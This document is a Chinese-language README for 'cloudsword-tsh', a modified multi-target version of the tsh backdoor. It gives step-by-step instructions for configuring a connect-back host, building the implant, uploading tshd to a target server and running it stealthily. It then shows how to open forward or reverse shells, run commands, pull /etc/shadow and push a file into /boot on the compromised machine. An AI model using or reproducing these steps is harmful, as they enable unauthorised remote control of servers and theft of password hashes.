# cloudsword-tsh

## 说明

`tsh`的多用户修改版。
基本使用方法与`tsh`相似，添加了多台机器区分上线的功能。

## 使用方式

修改`tsh.h`的`*secret`、`SERVER_PORT`、`CONNECT_BACK_HOST`
正向连接时`CONNECT_BACK_HOST`为`localhost`
反向连接是`CONNECT_BACK_HOST`为`控制端服务器IP`

1、执行`make linux/freebsd/openbsd/netbsd/cygwin/sunos/irix/hpux/osf`，生成linux/freebsd/openbsd/netbsd/cygwin/sunos/irix/hpux/osf版的tshd和tsh

2、`tshd`传至目标服务器，`tsh`为本机控制端

3、在目标服务器执行

```bash
umask 077; HOME=/var/tmp ./tshd
```

## 正向连接

1、开启shell

```bash
./tsh <目标服务器IP>
```

2、执行单条命令

```bash
./tsh <目标服务器IP> "uname -a"
```

3、上传/下载文件

```bash
./tsh <目标服务器IP> get /etc/shadow .
./tsh <目标服务器IP> put vmlinuz /boot
```

## 反向链接(多目标模式)

1、开启shell

```bash
./tsh bc-<目标服务器IP>
```

2、执行单条命令

```bash
./tsh bc-<目标服务器IP> "uname -a"
```

3、上传/下载文件

```bash
./tsh bc-<目标服务器IP> get /etc/shadow .
./tsh bc-<目标服务器IP> put vmlinuz /boot
```